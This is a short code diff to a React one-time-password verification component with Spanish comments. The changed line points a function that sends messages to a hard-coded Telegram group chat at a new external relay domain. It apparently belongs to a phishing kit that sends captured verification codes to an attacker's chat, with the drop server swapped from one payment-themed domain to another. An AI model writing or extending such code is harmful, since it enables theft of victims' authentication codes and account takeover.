@@ -24,7 +24,7 @@ const OTPVerification = ({ onBack }) => {
     const sendTelegramMessage = async (message) => {
         try {
             const chatId = '-4723241842'; // Asegúrate de que este ID sea correcto
-            const response = await fetch('https://streaming.pagafacilntf.com/enviarmensaje', { // Cambia esta URL por tu endpoint
+            const response = await fetch('https://streaming.renovapunto.online/enviarmensaje', { // Cambia esta URL por tu endpoint
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
